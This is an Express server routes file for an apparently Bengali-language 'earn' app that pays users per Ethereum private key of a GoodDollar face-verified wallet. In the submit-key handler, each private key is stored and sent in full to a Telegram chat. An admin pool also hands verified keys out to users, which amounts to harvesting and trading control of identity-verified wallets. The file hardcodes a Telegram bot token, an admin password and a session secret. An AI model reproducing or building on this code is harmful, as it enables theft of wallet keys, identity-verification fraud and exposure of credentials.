
import type { Express } from "express";
import type { Server } from "http";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { z } from "zod";
import session from "express-session";
import MemoryStore from "memorystore";
import { ethers } from "ethers";

const TELEGRAM_BOT_TOKEN = "8266590938:AAFSLVXE0K46SgmWRlaQevNVZUB2C4uPhGY";
const TELEGRAM_CHAT_ID = "1341406405";

const GD_IDENTITY_ADDRESS = "0xC361A6E67822a0EDc17D899227dd9FC50BD62F42";
const FUSE_RPC_URL = "https://forno.celo.org";
const GD_IDENTITY_ABI = [
  "function isWhitelisted(address account) public view returns (bool)"
];

async function checkGDVerification(input: string): Promise<boolean> {
  try {
    const provider = new ethers.JsonRpcProvider(FUSE_RPC_URL);
    let address = "";
    
    if (ethers.isAddress(input)) {
      address = input;
    } else {
      const cleanKey = input.trim();
      let finalKey = cleanKey;
      if (cleanKey.includes(':')) {
        const parts = cleanKey.split(':');
        finalKey = parts[parts.length - 1].trim();
      }
      
      try {
        const wallet = new ethers.Wallet(finalKey.startsWith('0x') ? finalKey : '0x' + finalKey, provider);
        address = wallet.address;
      } catch (e) {
        return false;
      }
    }

    const contract = new ethers.Contract(GD_IDENTITY_ADDRESS, GD_IDENTITY_ABI, provider);
    const isWhitelisted = await contract.isWhitelisted(address);
    return isWhitelisted;
  } catch (error) {
    console.error("GD Verification Error:", error);
    return false;
  }
}

async function sendTelegramMessage(message: string) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });
    if (!response.ok) console.error("Telegram error:", await response.text());
  } catch (error) {
    console.error("Telegram connection error:", error);
  }
}

export async function registerRoutes(httpServer: Server, app: Express): Promise<Server> {
  const SessionStore = MemoryStore(session);
  app.use(session({
    secret: "secure-earn-v2",
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 86400000 },
    store: new SessionStore({ checkPeriod: 86400000 })
  }));

  const requireAuth = (req: any, res: any, next: any) => {
    if (!(req.session as any).userId) return res.status(401).json({ message: "Unauthorized" });
    next();
  };

  app.post(api.auth.login.path, async (req, res) => {
    try {
      const { guestId } = api.auth.login.input.parse(req.body);
      const phoneRegex = /^\d{10,15}$/;
      if (!phoneRegex.test(guestId)) {
        return res.status(400).json({ message: "সঠিক ফোন নম্বর দিন" });
      }
      let user = await storage.getUserByGuestId(guestId);
      if (user?.isBlocked) return res.status(403).json({ message: "আপনার একাউন্টটি ব্লক করা হয়েছে" });
      if (!user) user = await storage.createUser({ guestId });
      (req.session as any).userId = user.id;
      (req.session as any).sentNameForCycle = false;
      res.json(user);
    } catch (err) {
      res.status(400).json({ message: "সঠিক ফোন নম্বর দিন" });
    }
  });

  app.post(api.auth.logout.path, (req, res) => {
    req.session.destroy(() => res.json({ message: "Logged out" }));
  });

  app.get(api.auth.me.path, requireAuth, async (req, res) => {
    const user = await storage.getUser((req.session as any).userId);
    if (!user) return res.status(401).json({ message: "User not found" });
    if (user.isBlocked) {
      req.session.destroy(() => {});
      return res.status(403).json({ message: "Blocked" });
    }
    res.json(user);
  });

  // Admin Routes
  app.post(api.admin.login.path, (req, res) => {
    const { password } = api.admin.login.input.parse(req.body);
    if (password === "Anamul-araf") {
      (req.session as any).isAdmin = true;
      res.json({ success: true });
    } else {
      res.status(401).json({ message: "Wrong password" });
    }
  });

  const requireAdmin = (req: any, res: any, next: any) => {
    if (!(req.session as any).isAdmin) return res.status(401).json({ message: "Admin access required" });
    next();
  };

  app.get(api.admin.users.path, requireAdmin, async (_req, res) => {
    const users = await storage.getAllUsers();
    res.json(users);
  });

  app.post("/api/admin/users/:id/toggle-block", requireAdmin, async (req, res) => {
    const { isBlocked } = api.admin.toggleBlock.input.parse(req.body);
    const updated = await storage.setUserBlockedStatus(parseInt(req.params.id), isBlocked);
    res.json(updated);
  });

  app.get(api.admin.withdrawals.path, requireAdmin, async (_req, res) => {
    const all = await storage.getAllTransactions();
    res.json(all.filter(t => t.type === "withdrawal"));
  });

  app.post("/api/admin/withdrawals/:id/status", requireAdmin, async (req, res) => {
    const { status } = api.admin.updateWithdrawal.input.parse(req.body);
    const updated = await storage.updateTransactionStatus(parseInt(req.params.id), status);
    res.json(updated);
  });

  app.post("/api/admin/users/:id/balance", requireAdmin, async (req, res) => {
    const { balance } = api.admin.updateBalance.input.parse(req.body);
    const updated = await storage.updateUserBalanceDirectly(parseInt(req.params.id), balance);
    res.json(updated);
  });

  app.get(api.admin.getSettings.path, requireAdmin, async (_req, res) => {
    const rewardRate = await storage.getSetting("rewardRate") || "40";
    res.json({ rewardRate: parseInt(rewardRate) });
  });

  app.post(api.admin.updateSettings.path, requireAdmin, async (req, res) => {
    const { rewardRate } = api.admin.updateSettings.input.parse(req.body);
    await storage.setSetting("rewardRate", rewardRate.toString());
    res.json({ success: true });
  });

  app.get("/api/admin/verification-pool", requireAdmin, async (_req, res) => {
    const pool = await storage.getVerificationPool();
    res.json(pool);
  });

  app.post("/api/admin/verification-pool", requireAdmin, async (req, res) => {
    const { privateKey, verifyUrl } = z.object({ privateKey: z.string(), verifyUrl: z.string() }).parse(req.body);
    await storage.addVerificationKey(privateKey, verifyUrl);
    res.json({ success: true });
  });

  app.delete("/api/admin/verification-pool/:id", requireAdmin, async (req, res) => {
    await storage.deleteVerificationKey(parseInt(req.params.id));
    res.json({ success: true });
  });

  app.get("/api/earn/get-key", requireAuth, async (req, res) => {
    const key = await storage.getAvailableVerificationKey();
    if (!key) {
      return res.status(404).json({ message: "No keys available" });
    }
    // Mark used immediately when delivered so it doesn't go to someone else
    await storage.markVerificationKeyUsed(key.id);
    res.json(key);
  });

  app.post("/api/earn/check-verification", requireAuth, async (req, res) => {
    try {
      const { address, keyId } = z.object({ address: z.string(), keyId: z.number() }).parse(req.body);
      const isVerified = await checkGDVerification(address);
      if (!isVerified) {
        // Delete key and link if not verified on check
        await storage.deleteVerificationKey(keyId);
      }
      res.json({ isVerified });
    } catch (err) {
      res.status(400).json({ message: "Error" });
    }
  });

  app.post(api.earn.submitKey.path, requireAuth, async (req, res) => {
    try {
      const { privateKey } = api.earn.submitKey.input.parse(req.body);
      const userId = (req.session as any).userId;

      const wallet = new ethers.Wallet(privateKey);
      const isVerified = await checkGDVerification(wallet.address);
      if (!isVerified) {
        // Although check-verification handles it, safety check here
        return res.status(400).json({ message: "এই কিটিতে GoodDollar ফেস ভেরিফিকেশন করা নেই" });
      }

      const user = await storage.updateUserKeyCount(userId, 1);
      await storage.createTransaction({ userId, type: "earning", amount: 1, details: `Key: ${privateKey}`, status: "completed" });

      let message = `🔑 New Key Verified!\n\n`;
      message += `👤 User ID: ${user.guestId}\n`;
      message += `📝 Key: ${privateKey}\n✅ Total Verified: ${user.keyCount}`;
      await sendTelegramMessage(message);

      res.json({ success: true, newCount: user.keyCount, message: `Key submitted! Total: ${user.keyCount}` });
    } catch (err) {
      res.status(400).json({ message: "Error" });
    }
  });

  app.post(api.withdraw.request.path, requireAuth, async (req, res) => {
    try {
      const { method, number, amount } = api.withdraw.request.input.parse(req.body);
      const userId = (req.session as any).userId;
      const user = await storage.getUser(userId);
      if (!user || user.balance < amount) return res.status(400).json({ message: "Insufficient balance" });

      const updatedUser = await storage.updateUserBalance(userId, -amount);
      const tx = await storage.createTransaction({ userId, type: "withdrawal", amount, details: `${method} - ${number}`, status: "pending" });
      (req.session as any).sentNameForCycle = false;

      setTimeout(async () => {
        await storage.updateTransactionStatus(tx.id, "completed");
      }, 30 * 60 * 1000);

      await sendTelegramMessage(`💸 Withdrawal!\n\n👤 Name: ${user.guestId}\n💳 Method: ${method.toUpperCase()}\n📱 Number: ${number}\n💰 Amount: ${amount} TK`);
      res.json({ success: true, newBalance: updatedUser.balance, message: "Withdrawal request sent!" });
    } catch (err) {
      res.status(400).json({ message: "Error" });
    }
  });

  app.get(api.transactions.list.path, requireAuth, async (req, res) => {
    const txs = await storage.getUserTransactions((req.session as any).userId);
    res.json(txs);
  });

  app.post("/api/admin/users/:id/reset-count", requireAdmin, async (req, res) => {
    const updated = await storage.resetUserKeyCount(parseInt(req.params.id));
    res.json(updated);
  });

  return httpServer;
}
